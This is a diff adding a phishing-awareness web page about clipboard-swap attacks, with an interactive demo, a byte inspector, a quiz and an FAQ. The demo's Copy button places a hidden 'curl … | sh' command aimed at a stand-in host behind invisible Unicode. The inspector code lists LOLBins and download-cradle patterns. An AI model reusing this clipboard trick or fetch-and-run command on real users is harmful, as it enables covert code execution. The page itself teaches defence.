@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<!-- skills-used: unlazy-gates, app_creation, public_page_preflight -->
+<html data-primary-keyword="what is phishing" lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>What Is Phishing? The Clipboard Paste Attack</title>
+<meta name="description" content="What is phishing? It can hide in your clipboard. Try the fake-installer copy demo and see the invisible characters attackers use to deceive you.">
+<script type="application/ld+json">
+{"@context": "https://schema.org", "@type": "FAQPage", "mainEntity": [{"@type": "Question", "name": "What is phishing, exactly?", "acceptedAnswer": {"@type": "Answer", "text": "Phishing is a deception attack that tricks you into acting against your own interests — running an attacker's command, entering credentials on a fake page, or sending money to a scammer. Classic phishing arrives by email or text, but the October 2026 fake-installer campaign showed it can hide in your clipboard: the command you see and the bytes you paste are different things. Always verify before you act."}}, {"@type": "Question", "name": "How did the fake Claude installer attack work?", "acceptedAnswer": {"@type": "Answer", "text": "In October 2026, fake Claude installer sites promoted through search ads showed visitors a harmless-looking install command. Their Copy button placed a different command on the clipboard — one that fetched and ran a remote payload. Victims pasted and ran bytes they never saw. Campaign coverage reports 4 in 5 (80%) of these ClickFix-style attacks now arrive via search rather than email."}}, {"@type": "Question", "name": "What is a zero-width character, and why does it matter?", "acceptedAnswer": {"@type": "Answer", "text": "A zero-width character (like U+200B) is a real byte that renders as nothing on screen. Attackers hide commands after one: you see 'npm install widget' but the clipboard holds 'npm install widget[hidden]; curl evil | sh'. Your terminal executes the bytes, not the pixels. A byte inspector makes the hidden part visible before you paste."}}, {"@type": "Question", "name": "Can I check my clipboard before pasting?", "acceptedAnswer": {"@type": "Answer", "text": "Yes. The byte inspector on this page analyzes any text you paste into it — install commands, contract clauses, wallet addresses — and reports invisible unicode, ANSI escapes, direction overrides, suspicious launchers, and lookalike URLs with PASS, WARN, or BLOCK verdicts. Everything runs in your browser; nothing is uploaded. The open-source paste-truth-guard tool does the same from your terminal."}}, {"@type": "Question", "name": "Does a clean scan mean a command is safe to run?", "acceptedAnswer": {"@type": "Answer", "text": "No. A clean scan means no known deception markers were found — not that the command is safe. A perfectly visible malicious command still passes, because the tool checks whether what you see matches what you would paste, not whether the visible text itself is wise to run. Treat a clean scan as one check passed, not as permission."}}]}
+</script>
+<link rel="canonical" href="https://iceman2050.github.io/ingeniousai-security-checks-mirror/clipboard-paste-truth-check.html">
+<meta property="og:title" content="What Is Phishing? The Clipboard Paste Attack — Try the Demo">
+<meta property="og:description" content="Copy this 'harmless' install command — then see what your clipboard REALLY holds. Interactive byte-level demo of the October 2026 fake-installer phishing campaign.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://iceman2050.github.io/ingeniousai-security-checks-mirror/clipboard-paste-truth-check.html">
+<meta property="og:image" content="https://iceman2050.github.io/ingeniousai-security-checks-mirror/og-default.png">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="stylesheet" href="ecosystem.css">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0b0f17;color:#e6edf3;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;line-height:1.65}
+.wrap{max-width:760px;margin:0 auto;padding:48px 20px}
+.badge{display:inline-block;background:#0d1a0f;border:1px solid #3fb950;color:#7ee787;font-size:13px;font-weight:700;padding:6px 14px;border-radius:999px;margin-bottom:20px;letter-spacing:.5px}
+h1{font-size:34px;line-height:1.25;margin-bottom:16px}
+p.lead{font-size:18px;color:#9aa7b8;margin-bottom:24px}
+.answer{background:#0d1626;border:1px solid #1c6ef2;border-radius:10px;padding:16px 20px;font-size:16px;margin-bottom:24px}
+.answer strong{color:#fff}
+.card{background:#11161f;border:1px solid #232b38;border-radius:12px;padding:28px;margin:24px 0}
+.card h2{font-size:20px;margin-bottom:12px;color:#fff}
+.card h3{font-size:17px;margin:18px 0 8px;color:#fff}
+ul{margin:10px 0 10px 20px} li{margin:8px 0}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:14px}
+th,td{border:1px solid #2a3342;padding:8px 10px;text-align:left;vertical-align:top}
+th{background:#161d29;color:#fff}
+code{background:#000;border:1px solid #2a3342;border-radius:4px;padding:1px 6px;font-size:13px;color:#7ee787}
+.cmdbox{background:#000;border:1px solid #3fb950;border-radius:8px;padding:16px 18px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:15px;color:#7ee787;margin:14px 0;overflow-x:auto}
+.btnrow{display:flex;gap:10px;flex-wrap:wrap;margin:12px 0}
+button{background:#1c6ef2;border:none;color:#fff;padding:11px 22px;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
+button.ghost{background:#161d29;border:1px solid #2a3342;color:#e6edf3}
+button:disabled{opacity:.5;cursor:default}
+#demo-result,#inspect-result{display:none;margin-top:14px;border-radius:10px;padding:16px 18px;font-size:14px}
+#demo-result.show,#inspect-result.show{display:block}
+.vPASS{background:#0d1a0f;border:1px solid #3fb950}
+.vWARN{background:#1a1408;border:1px solid #d29922}
+.vBLOCK{background:#1a0f0f;border:1px solid #f85149}
+.verdline{font-size:17px;font-weight:700;margin-bottom:8px}
+.finding{border-top:1px solid #2a3342;padding:8px 0;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:13px}
+.finding .cat{color:#d29922;font-weight:700}
+textarea{width:100%;min-height:110px;background:#000;border:1px solid #2a3342;border-radius:8px;color:#e6edf3;padding:12px;font-size:14px;font-family:ui-monospace,Menlo,Consolas,monospace}
+.note{font-size:14px;color:#9aa7b8}
+.src{font-size:13px;color:#6b7688;margin-top:10px}
+.src a{color:#1c6ef2}
+.back{display:inline-block;margin-bottom:18px;color:#6ea8fe;text-decoration:none;font-size:14px}
+.q{border:1px solid #2a3342;border-radius:10px;padding:18px;margin:14px 0;background:#0d1219}
+.opts{display:flex;gap:10px;flex-wrap:wrap}
+.opts button{background:#161d29;border:1px solid #2a3342;color:#e6edf3;padding:10px 22px;border-radius:8px;font-size:15px;cursor:pointer;font-weight:400}
+.sel-yes{background:#0d2b16;border-color:#3fb950;color:#7ee787}
+.sel-no{background:#2b1215;border-color:#f85149;color:#ffa198}
+#verdict{display:none;border-left:4px solid #d29922;padding:18px;background:#1a1408;border-radius:0 8px 8px 0;margin-top:20px;font-size:16px}
+.good{border-color:#3fb950;background:#0d1a0f}
+.bad{border-color:#f85149;background:#1a0f0f}
+.verd{font-size:19px;letter-spacing:.5px}
+details{border:1px solid #2a3342;border-radius:10px;padding:14px 18px;margin:12px 0;background:#0d1219}
+summary{cursor:pointer;font-weight:700;color:#fff}
+details p{margin-top:10px}
+.xlinks{margin:24px 0;padding:18px;background:#0d1219;border:1px solid #2a3342;border-radius:10px}
+.xlinks a{color:#6ea8fe}
+.feat{margin:24px 0;padding:20px;background:#0d1a0f;border:1px solid #3fb950;border-radius:10px}
+.feat a{color:#7ee787;font-weight:700}
+.sharebox{margin:24px 0;padding:18px;background:#0d1626;border:1px solid #1c6ef2;border-radius:10px}
+.sharebox a{color:#6ea8fe;margin-right:14px}
+.platline{font-size:13px;color:#6b7688;margin:18px 0;line-height:2}
+.platline a{color:#6ea8fe}
+</style>
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Organization", "name": "Ingenious AI", "url": "https://iceman2050.github.io/ingeniousai-security-checks-mirror/"}</script>
+</head>
+<body>
+<div class="wrap">
+<a class="back" href="index.html">&larr; All security checks</a>
+<div class="badge">CLIPBOARD SECURITY DEMO &middot; <time datetime="2026-10-19">October 19, 2026</time></div>
+<h1>What Is Phishing? Watch a &lsquo;Harmless&rsquo; Paste Betray Itself</h1>
+<p class="lead">What is phishing? Most people picture a fake email asking for a password. But in October 2026, attackers skipped email entirely: a fake Claude installer site displayed a harmless-looking install command, while its Copy button placed a different command on visitors' clipboards. Phishing is a deception attack that tricks you into running the attacker's code or handing over credentials &mdash; and 4 in 5 (80%) of these ClickFix-style attacks now arrive through search results, per the campaign coverage. This page replays the trick on you, safely, then shows the byte-level truth hiding in your clipboard.</p>
+
+<div class="answer"><strong>Direct answer:</strong> What you see is not always what you paste. A single invisible character &mdash; a zero-width space, a right-to-left override, an ANSI escape &mdash; can make a harmless-looking command carry a hidden payload. The only reliable check is byte-level: compare the visible text against the actual bytes before you run anything you copied.</div>
+
+<div class="card">
+<h2>What is phishing via clipboard deception?</h2>
+<p>Clipboard-deception phishing shows you one command and copies another. The visible text &mdash; <code>npm install claude-desktop</code> &mdash; looks safe, but the clipboard bytes can hide a second command after a zero-width character or a direction override. Your terminal runs the bytes, not the pixels. Inspecting those bytes before pasting is the difference between installing software and installing malware.</p>
+</div>
+
+<div class="card">
+<h2>Try it: the copy button lies to you</h2>
+<p>This is the exact trick from the October 2026 fake-installer campaign, replayed safely. The box shows a harmless install command. Click <strong>Copy install command</strong> &mdash; then click <strong>Reveal what was copied</strong> to see the byte-level truth.</p>
+<div class="cmdbox"><code>npm install claude-desktop</code></div>
+<div class="btnrow">
+<button id="demo-copy">Copy install command</button>
+<button id="demo-reveal" class="ghost">Reveal what was copied</button>
+</div>
+<p class="note" id="demo-status">Nothing copied yet. The reveal works even if your browser blocks the clipboard write &mdash; it shows what the button <em>tried</em> to copy.</p>
+<div id="demo-result"></div>
+</div>
+
+<div class="card">
+<h2>Paste your own text: the byte inspector</h2>
+<p>Paste anything you copied from the web &mdash; an install command, a contract clause, a wallet address &mdash; and inspect its bytes before you trust it. Everything runs in your browser; nothing is uploaded or sent anywhere.</p>
+<textarea id="inspect-text" placeholder="Paste the copied text here, then click Inspect bytes&hellip;"></textarea>
+<div class="btnrow"><button id="inspect-btn">Inspect bytes</button></div>
+<div id="inspect-result"></div>
+</div>
+
+<div class="card">
+<h2>What the inspector looks for</h2>
+<table>
+<tr><th>Marker</th><th>What it means</th><th>Verdict</th></tr>
+<tr><td>Invisible unicode</td><td>Zero-width spaces, soft hyphens, BOM bytes &mdash; real bytes that render as nothing</td><td>WARN</td></tr>
+<tr><td>Bidirectional override</td><td>U+202E and friends &mdash; the classic &ldquo;evil.exe disguised as exe.txt&rdquo; trick</td><td>WARN alone</td></tr>
+<tr><td>ANSI escapes</td><td>Terminal control sequences, including OSC hyperlinks that can mask link targets</td><td>WARN</td></tr>
+<tr><td>Suspicious launcher</td><td>powershell, mshta, certutil, bitsadmin, regsvr32 &mdash; living-off-the-land binaries</td><td>WARN alone</td></tr>
+<tr><td>Suspicious URL</td><td>Punycode (xn--), @ userinfo tricks, non-ASCII hosts, bare IPs</td><td>WARN</td></tr>
+<tr><td>Visible divergence</td><td>The bytes differ from the rendered text &mdash; shown as a byte-level diff</td><td>WARN</td></tr>
+<tr><td>Launcher + remote fetch</td><td>e.g. mshta with a URL, PowerShell with a download cradle</td><td><strong>BLOCK</strong></td></tr>
+<tr><td>Bidi override + URL</td><td>Direction spoofing aimed at a link or filename</td><td><strong>BLOCK</strong></td></tr>
+</table>
+<p class="note">A clean scan means no known deception markers were found &mdash; not that the visible command is wise to run. A perfectly visible dangerous command still passes; your judgment is the last gate.</p>
+</div>
+
+<div class="card">
+<h2>The October 2026 fake-installer campaign</h2>
+<p>On October 9, 2026, Push Security and BleepingComputer reported a campaign researchers called &ldquo;Deception&rdquo;: fake Claude installer sites, promoted through Bing redirects inside Google ads, showed visitors a harmless-looking install command while their Copy buttons placed a different command on the clipboard &mdash; one that fetched and ran a remote payload. Campaign analysis found 4 in 5 (80%) of these ClickFix-style attacks now arrive via search results rather than email. <span class="note">(News coverage, not independently verified by Ingenious AI.)</span></p>
+<p>The defense is unglamorous: inspect the bytes before you paste. The open-source <strong>paste-truth-guard</strong> tool does exactly this from your terminal &mdash; stdlib-only Python, no network, on demand.</p>
+<p class="src">Source: SCWorld brief on the fake-Claude-installer campaign, October 9, 2026: <a href="https://www.scworld.com/brief/hackers-use-bing-redirects-in-google-ads-for-fake-claude-installers">scworld.com/brief/hackers-use-bing-redirects-in-google-ads-for-fake-claude-installers</a></p>
+</div>
+
+<div class="card">
+<h2>Test yourself: the paste-truth quiz</h2>
+<div class="q" data-correct="1">
+<p><strong>1.</strong> You copy <code>npm install widget</code> from a tutorial site. What is the safest check before pasting it into your terminal?</p>
+<div class="opts"><button>Trust it &mdash; the site looks professional</button><button>Paste it into a byte inspector and compare visible text vs actual bytes</button><button>Paste it, then read it quickly before pressing Enter</button></div>
+</div>
+<div class="q" data-correct="0">
+<p><strong>2.</strong> What does a zero-width space (U+200B) do in copied text?</p>
+<div class="opts"><button>Nothing visible &mdash; but the byte is still there when pasted</button><button>It shows as a blank space</button><button>It deletes the character before it</button></div>
+</div>
+<div class="q" data-correct="2">
+<p><strong>3.</strong> A pasted command contains a right-to-left override (U+202E) next to a URL. The verdict is&hellip;</p>
+<div class="opts"><button>PASS &mdash; direction marks are harmless</button><button>WARN</button><button>BLOCK</button></div>
+</div>
+<div class="q" data-correct="1">
+<p><strong>4.</strong> The October 2026 &ldquo;Deception&rdquo; campaign spread fake Claude installers mainly through&hellip;</p>
+<div class="opts"><button>Email attachments</button><button>Search results and ads</button><button>USB drives</button></div>
+</div>
+<div class="q" data-correct="1">
+<p><strong>5.</strong> A clean scan from a byte inspector means&hellip;</p>
+<div class="opts"><button>The command is definitely safe to run</button><button>No known deception markers were found &mdash; your judgment still matters</button><button>The clipboard is empty</button></div>
+</div>
+<div id="verdict"></div>
+</div>
+
+<div class="card">
+<h2>Frequently asked questions</h2>
+<details><summary>What is phishing, exactly?</summary><p>Phishing is a deception attack that tricks you into acting against your own interests &mdash; running an attacker's command, entering credentials on a fake page, or sending money to a scammer. Classic phishing arrives by email or text, but the October 2026 fake-installer campaign showed it can hide in your clipboard: the command you see and the bytes you paste are different things. Always verify before you act.</p></details>
+<details><summary>How did the fake Claude installer attack work?</summary><p>In October 2026, fake Claude installer sites promoted through search ads showed visitors a harmless-looking install command. Their Copy button placed a different command on the clipboard &mdash; one that fetched and ran a remote payload. Victims pasted and ran bytes they never saw. Campaign coverage reports 4 in 5 (80%) of these ClickFix-style attacks now arrive via search rather than email.</p></details>
+<details><summary>What is a zero-width character, and why does it matter?</summary><p>A zero-width character (like U+200B) is a real byte that renders as nothing on screen. Attackers hide commands after one: you see &ldquo;npm install widget&rdquo; but the clipboard holds the visible text plus a hidden second command. Your terminal executes the bytes, not the pixels. A byte inspector makes the hidden part visible before you paste.</p></details>
+<details><summary>Can I check my clipboard before pasting?</summary><p>Yes. The byte inspector on this page analyzes any text you paste into it &mdash; install commands, contract clauses, wallet addresses &mdash; and reports invisible unicode, ANSI escapes, direction overrides, suspicious launchers, and lookalike URLs with PASS, WARN, or BLOCK verdicts. Everything runs in your browser; nothing is uploaded. The open-source paste-truth-guard tool does the same from your terminal.</p></details>
+<details><summary>Does a clean scan mean a command is safe to run?</summary><p>No. A clean scan means no known deception markers were found &mdash; not that the command is safe. A perfectly visible malicious command still passes, because the tool checks whether what you see matches what you would paste, not whether the visible text itself is wise to run. Treat a clean scan as one check passed, not as permission.</p></details>
+</div>
+
+<div class="sharebox">
+<strong>Share this check:</strong><br><br>
+<a href="https://twitter.com/intent/tweet?text=Copy%20this%20%27harmless%27%20install%20command%20%E2%80%94%20then%20see%20what%20your%20clipboard%20REALLY%20holds.%20Interactive%20phishing%20demo%20by%20Ingenious%20AI&url=https%3A%2F%2Ficeman2050.github.io%2Fingeniousai-security-checks-mirror%2Fclipboard-paste-truth-check.html">Post on X</a>
+<a href="https://wa.me/?text=What%20is%20phishing%3F%20It%20can%20hide%20in%20your%20clipboard.%20Try%20this%20interactive%20demo%3A%20https%3A%2F%2Ficeman2050.github.io%2Fingeniousai-security-checks-mirror%2Fclipboard-paste-truth-check.html">Share on WhatsApp</a>
+<a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Ficeman2050.github.io%2Fingeniousai-security-checks-mirror%2Fclipboard-paste-truth-check.html">Share on LinkedIn</a>
+</div>
+
+<div class="feat">
+<strong>Featured:</strong> <a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI!%20I%20want%20early%20access%20to%20BreachHunter.">BreachHunter</a> &mdash; fake installers are a breach waiting to happen. BreachHunter maps your real attack-surface exposure so one bad paste doesn't become a breach. <a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI!%20I%20want%20early%20access%20to%20BreachHunter.">Get early access on WhatsApp</a>.
+</div>
+
+<p class="platline">All 11 Ingenious AI platforms &mdash; early access on WhatsApp:
+<a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI!%20I%20want%20early%20access%20to%20DisclosureGuard">DisclosureGuard</a> &middot;
+<a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI!%20I%20want%20early%20access%20to%20ModelMinder">ModelMinder</a> &middot;
+<a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI!%20I%20want%20early%20access%20to%20TermsWatch">TermsWatch</a> &middot;
+<a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI!%20I%20want%20early%20access%20to%20Vibe-Code%20Audit">Vibe-Code Audit</a> &middot;
+<a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI!%20I%20want%20early%20access%20to%20Rogue-Agent%20Defense">Rogue-Agent Defense</a> &middot;
+<a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI!%20I%20want%20early%20access%20to%20BreachHunter">BreachHunter</a> &middot;
+<a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI!%20I%20want%20early%20access%20to%20ChatBreaker">ChatBreaker</a> &middot;
+<a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI!%20I%20want%20early%20access%20to%20Agent%20Flight%20Recorder">Agent Flight Recorder</a> &middot;
+<a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI!%20I%20want%20early%20access%20to%20Agent%20Auth%20Gateway">Agent Auth Gateway</a> &middot;
+<a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI!%20I%20want%20early%20access%20to%20DomainGuard">DomainGuard</a> &middot;
+<a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI!%20I%20want%20early%20access%20to%20ContentCraft%20AI">ContentCraft AI</a></p>
+
+<div class="xlinks">
+<strong>Related checks:</strong>
+<a href="fake-apex-accelerator-npm-check.html">Fake Apex Accelerator npm Malware</a> &middot;
+<a href="ai-ransomware-84-percent-check.html">AI in 84% of Ransomware Attacks</a> &middot;
+<a href="hawk-pqc-ai-break-check.html">HAWK PQC Break</a> &middot;
+<a href="cisa-election-phishing-warning-check.html">CISA Election Phishing Warning</a> &middot;
+<a href="deepfake-defense-kit.html">Deepfake Defense Kit</a><br><br>
+<a href="all-links.html">All security checks</a> &middot; <a href="security-suite.html">All 11 platforms, one price</a>
+</div>
+
+<p class="src">Sources: SCWorld brief on the October 9, 2026 fake-Claude-installer campaign (Push Security / BleepingComputer reporting; news coverage, not independently verified); paste-truth-guard open-source clipboard-byte inspector by Ingenious AI. The 4-in-5 (80%) ClickFix-via-search figure is as reported in the campaign coverage.</p>
+
+</div>
+<div id="ecosystem-footer"></div>
+<script src="ecosystem.js"></script>
+<script>
+/* Pure byte-analysis logic — no DOM access here, so it runs headless under node. */
+var PTG_INVISIBLE = {'\u200b':'ZERO WIDTH SPACE','\u200c':'ZERO WIDTH NON-JOINER','\u200d':'ZERO WIDTH JOINER','\ufeff':'ZERO WIDTH NO-BREAK SPACE (BOM)','\u00ad':'SOFT HYPHEN','\u2060':'WORD JOINER','\u180e':'MONGOLIAN VOWEL SEPARATOR','\u200e':'LEFT-TO-RIGHT MARK','\u200f':'RIGHT-TO-LEFT MARK','\u061c':'ARABIC LETTER MARK'};
+var PTG_BIDI = {'\u202a':'LEFT-TO-RIGHT EMBEDDING','\u202b':'RIGHT-TO-LEFT EMBEDDING','\u202c':'POP DIRECTIONAL FORMATTING','\u202d':'LEFT-TO-RIGHT OVERRIDE','\u202e':'RIGHT-TO-LEFT OVERRIDE','\u2066':'LEFT-TO-RIGHT ISOLATE','\u2067':'RIGHT-TO-LEFT ISOLATE','\u2068':'FIRST STRONG ISOLATE','\u2069':'POP DIRECTIONAL ISOLATE'};
+var PTG_LAUNCHERS = ['powershell','pwsh','mshta','certutil','bitsadmin','regsvr32','rundll32','wscript','cscript'];
+var PTG_FETCH = [/downloadstring/i, /invoke-/i, /\biex\b/i, /encodedcommand/i, /-enc(?:odedcommand)?\b/i, /frombase64string/i, /bitsadmin\s+\/transfer/i, /certutil\s+.*-urlcache/i, /curl\b.*\|\s*(?:ba)?sh/i, /wget\b.*\|\s*(?:ba)?sh/i, /\|\s*iex\b/i];
+function ptgIsStripped(ch) {
+  if (PTG_INVISIBLE[ch] || PTG_BIDI[ch]) return true;
+  var c = ch.charCodeAt(0);
+  return c <= 8 || c === 11 || c === 12 || (c >= 14 && c <= 31) || c === 127 || (c >= 128 && c <= 159);
+}
+function ptgStripInvisible(t) {
+  return t.replace(/\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)/g, '')
+    .replace(/\x1b\[[0-9;?]*[ -\/]*[@-~]/g, '')
+    .replace(/\x1b[()][0-9A-B]/g, '')
+    .replace(/[\u200b\u200c\u200d\ufeff\u00ad\u2060\u180e\u200e\u200f\u061c\u202a\u202b\u202c\u202d\u202e\u2066\u2067\u2068\u2069]/g, '')
+    .replace(/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f\x80-\x9f]/g, '');
+}
+function ptgAnalyze(raw) {
+  var findings = [];
+  function add(cat, s, e, detail) {
+    findings.push({category: cat, span: [s, e], spanRepr: JSON.stringify(raw.slice(s, e)), detail: detail});
+  }
+  var i, m;
+  for (i = 0; i < raw.length; i++) {
+    var ch = raw[i];
+    if (PTG_INVISIBLE[ch]) add('invisible-unicode', i, i + 1, 'invisible character: ' + PTG_INVISIBLE[ch]);
+    else if (PTG_BIDI[ch]) add('bidi-override', i, i + 1, 'bidirectional control: ' + PTG_BIDI[ch]);
+  }
+  var rx;
+  rx = /\x1b\[[0-9;?]*[ -\/]*[@-~]/g; while ((m = rx.exec(raw))) add('ansi-escape', m.index, m.index + m[0].length, 'ANSI escape sequence (terminal control)');
+  rx = /\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)/g; while ((m = rx.exec(raw))) add('ansi-escape', m.index, m.index + m[0].length, 'ANSI OSC sequence (can set terminal title / hyperlink)');
+  var URLRE = /https?:\/\/[^\s'"<>`\]\)]+/gi, hasUrl = false, hasSuspUrl = false;
+  while ((m = URLRE.exec(raw))) {
+    hasUrl = true;
+    var auth = m[0].replace(/^https?:\/\//i, '').split('/')[0];
+    var host = auth.split('@').pop().split(':')[0];
+    var reasons = [];
+    if (/xn--/i.test(host)) reasons.push('punycode (IDN homograph risk)');
+    if (auth.indexOf('@') !== -1) reasons.push("userinfo '@' in authority (credential/redirect trick)");
+    if (/[^\x00-\x7f]/.test(host)) reasons.push('non-ASCII characters in hostname (lookalike risk)');
+    if (/^\d{1,3}(\.\d{1,3}){3}$/.test(host)) reasons.push('bare IP hostname (no domain accountability)');
+    if (reasons.length) { hasSuspUrl = true; add('suspicious-url', m.index, m.index + m[0].length, 'URL: ' + reasons.join('; ')); }
+  }
+  var launcherHit = false, fetch = PTG_FETCH.some(function(r) { return r.test(raw); });
+  PTG_LAUNCHERS.forEach(function(name) {
+    var lr = new RegExp('\\b' + name + '\\b', 'gi'), lm;
+    while ((lm = lr.exec(raw))) {
+      launcherHit = true;
+      add('suspicious-command', lm.index, lm.index + lm[0].length,
+        "living-off-the-land binary '" + name + "'" + (fetch ? ' COMBINED WITH remote-fetch pattern' : ''));
+    }
+  });
+  if (fetch && !launcherHit) {
+    PTG_FETCH.forEach(function(r) {
+      var fr = new RegExp(r.source, 'gi'), fm;
+      while ((fm = fr.exec(raw))) add('suspicious-command', fm.index, fm.index + fm[0].length, 'remote-execution pattern — pasted blob fetches and runs remote code');
+    });
+  }
+  var vis = ptgStripInvisible(raw);
+  if (vis !== raw) {
+    var ansiSpans = [], ar;
+    [/\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)/g, /\x1b\[[0-9;?]*[ -\/]*[@-~]/g, /\x1b[()][0-9A-B]/g].forEach(function(x) {
+      while ((ar = x.exec(raw))) ansiSpans.push([ar.index, ar.index + ar[0].length]);
+    });
+    function inAnsi(p) { return ansiSpans.some(function(s) { return p >= s[0] && p < s[1]; }); }
+    i = 0;
+    while (i < raw.length) {
+      if (inAnsi(i) || ptgIsStripped(raw[i])) {
+        var j = i;
+        while (j < raw.length && (inAnsi(j) || ptgIsStripped(raw[j]))) j++;
+        add('visible-divergence', i, j, 'these bytes are invisible on screen but WILL be pasted');
+        i = j;
+      } else i++;
+    }
+  }
+  findings.sort(function(a, b) { return a.span[0] - b.span[0] || (a.category < b.category ? -1 : 1); });
+  var hasBidi = findings.some(function(f) { return f.category === 'bidi-override'; });
+  var verdict = 'PASS';
+  if (findings.length) verdict = 'WARN';
+  if ((hasBidi && (hasSuspUrl || launcherHit)) || (launcherHit && (fetch || hasUrl))) verdict = 'BLOCK';
+  return {verdict: verdict, findings: findings};
+}
+/* The demo: what the page SHOWS vs what the button COPIES. \u escapes keep
+   the source readable; the runtime bytes are the deceptive ones. */
+var DEMO_VISIBLE = "npm install claude-desktop";
+var DEMO_ACTUAL = "npm install claude-desktop​; curl -sL http://claude-desk-code.example/setup.sh | sh # ‮done";
+/* ---- browser-only wiring below ---- */
+if (typeof window !== 'undefined' && typeof document !== 'undefined') {
+  function esc(s) { return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;'); }
+  function renderAnalysis(elId, r) {
+    var el = document.getElementById(elId);
+    var cls = r.verdict === 'PASS' ? 'vPASS' : (r.verdict === 'WARN' ? 'vWARN' : 'vBLOCK');
+    var h = '<div class="verdline">Verdict: ' + r.verdict + ' &mdash; ' + r.findings.length + ' finding(s)</div>';
+    r.findings.forEach(function(f) {
+      h += '<div class="finding"><span class="cat">[' + esc(f.category) + ']</span> bytes ' + f.span[0] + ':' + f.span[1] +
+        ' <code>' + esc(f.spanRepr) + '</code><br>' + esc(f.detail) + '</div>';
+    });
+    if (!r.findings.length) h += '<p>What you see is what you would paste.</p>';
+    el.className = 'show ' + cls;
+    el.innerHTML = h;
+  }
+  document.getElementById('demo-copy').addEventListener('click', function() {
+    var st = document.getElementById('demo-status');
+    function done(ok) {
+      st.innerHTML = ok
+        ? 'Copied. Now click <strong>Reveal what was copied</strong> &mdash; or paste into any text editor and look closely.'
+        : 'Clipboard write was blocked by the browser &mdash; the reveal below still shows what the button <em>tried</em> to copy.';
+    }
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(DEMO_ACTUAL).then(function() { done(true); }, function() { done(false); });
+    } else {
+      var ta = document.createElement('textarea');
+      ta.value = DEMO_ACTUAL; document.body.appendChild(ta); ta.select();
+      var ok = false;
+      try { ok = document.execCommand('copy'); } catch (e) { ok = false; }
+      document.body.removeChild(ta); done(ok);
+    }
+  });
+  document.getElementById('demo-reveal').addEventListener('click', function() {
+    renderAnalysis('demo-result', ptgAnalyze(DEMO_ACTUAL));
+  });
+  document.getElementById('inspect-btn').addEventListener('click', function() {
+    var t = document.getElementById('inspect-text').value;
+    if (!t) { document.getElementById('inspect-result').className = 'show vWARN'; document.getElementById('inspect-result').innerHTML = '<p>Paste some text first.</p>'; return; }
+    renderAnalysis('inspect-result', ptgAnalyze(t));
+  });
+  document.querySelectorAll('.q').forEach(function(q) {
+    var btns = q.querySelectorAll('button'), correct = parseInt(q.dataset.correct, 10), done = false;
+    btns.forEach(function(b, i) {
+      b.addEventListener('click', function() {
+        if (done) return; done = true;
+        btns.forEach(function(x, j) { x.classList.add(j === correct ? 'sel-yes' : 'sel-no'); });
+        var v = document.getElementById('verdict'); v.style.display = 'block';
+        var total = document.querySelectorAll('.q').length;
+        var right = document.querySelectorAll('.q .sel-yes').length;
+        if (i === correct) { v.className = 'good'; v.innerHTML = '<span class="verd">Correct.</span> ' + right + ' of ' + total + ' so far.'; }
+        else { v.className = 'bad'; v.innerHTML = '<span class="verd">Not quite.</span> The highlighted answer is the verified one. ' + right + ' of ' + total + ' so far.'; }
+      });
+    });
+  });
+}
+</script>
+<script async src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"token": "376c9de98060423683cfe15cec38f36b"}'></script>
+</body>
+</html>
